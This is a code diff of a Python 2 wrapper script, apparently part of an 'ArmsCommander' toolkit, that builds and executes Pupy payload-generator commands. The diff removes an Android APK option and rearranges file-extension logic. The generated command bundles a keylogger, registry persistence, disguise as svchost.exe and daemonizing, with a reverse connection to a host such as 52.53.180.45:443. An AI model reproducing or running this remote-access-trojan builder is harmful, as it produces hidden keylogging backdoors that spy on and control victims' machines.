@@ -20,9 +20,8 @@ format_Dict = {
     '4': 'py_oneliner',
     '5': 'ps1',
     '6': 'ps1_oneliner',
-    '7': 'rubber_ducky',
-    '8': 'apk'
-}
+    '7': 'rubber_ducky'
+    }
 
 # New syntax format Pupy Generator is...
 # python pupygen.py -f client -O windows --randomize-hash connect --host 52.53.180.45:443
@@ -34,9 +33,8 @@ format_List = [
     '4 One-Liner HTTP Download-to-Memory Payload',
     '5 ps1 Powershell script, injects a pupy dll into a current process',
     '6 ps1 Remote Download Powershell-to-Pupy script',
-    '7 Rubber Ducky Script and Injection binary file',
-    '8 Generate a Android-Compatible Pupy APK installer'
-]
+    '7 Rubber Ducky Script and Injection binary file'
+    ]
 #
 
 transport_Dict = {
@@ -112,14 +110,7 @@ Transport_Chosen = transport_Dict[Transport_Type]
 # root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443
     # assigns all the file extension types
 Format_Chosen = Format_Chosen
-if Format_Chosen == 'client':
-    # this is a subdirectory for anything for Option #1 "client", they have a Windows, Linux, and Android option
-    if Operating_System == 'windows':
-        file_extension = 'exe'
-    if Operating_System == "linux":
-        file_extension = 'lin'
-    if Operating_System == "android":
-        file_extension = 'apk'
+
 if Format_Chosen == 'py':
     file_extension = 'py'
 if Format_Chosen == 'pyinst':
@@ -128,7 +119,21 @@ if Format_Chosen == "ps1":
     file_extension = "ps1"
 if Format_Chosen == "apk":
     file_extension = "apk"
+# need to make separate command strings
 
+if Operating_System == 'windows':
+    file_extension = 'exe'
+if Operating_System == "linux":
+    file_extension = 'lin'
+if Operating_System == "android":
+    file_extension = 'apk'
+    Format_Chosen = 'client'
+if Format_Chosen == 'py':
+    file_extension = 'py'
+if Format_Chosen == 'pyinst':
+    file_extension = 'py'
+if Format_Chosen == "ps1":
+    file_extension = "ps1"
 cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=registry -s keylogger -s hide_argv,name=svchost.exe -s daemonize -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
     Format_Chosen, # 0
     Operating_System, # 1
@@ -142,8 +147,33 @@ cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=reg
     host_Port, # 9
     Transport_Chosen # 10
 
-)
-
+    )
+# if Format_Chosen != 'client': # if not equal client....
+#     if Format_Chosen == 'apk':
+#
+#         Operating_System = 'android'
+#         cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=registry -s keylogger -s hide_argv,name=svchost.exe -s daemonize -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
+#             Format_Chosen, # 0
+#             Operating_System, # 1
+#             Architecture_Value, #2
+#             Format_Chosen, #3
+#             Operating_System, # 4
+#             Architecture_Value, # 5
+#             Transport_Chosen, # 6
+#             file_extension, # 7
+#             host_Connectback, # 8
+#             host_Port, # 9
+#             Transport_Chosen # 10
+#
+#         )
+    # if Format_Chosen == 'py':
+    #     file_extension = 'py'
+    # if Format_Chosen == 'pyinst':
+    #     file_extension = 'py'
+    # if Format_Chosen == "ps1":
+    #     file_extension = "ps1"
+    # if Format_Chosen == "apk":
+    #     file_extension = "apk"
 print colored(cmd_String,'red','on_white')
 os.system(cmd_String)
 # payload_dir = '/root/ArmsCommander/payloads/'
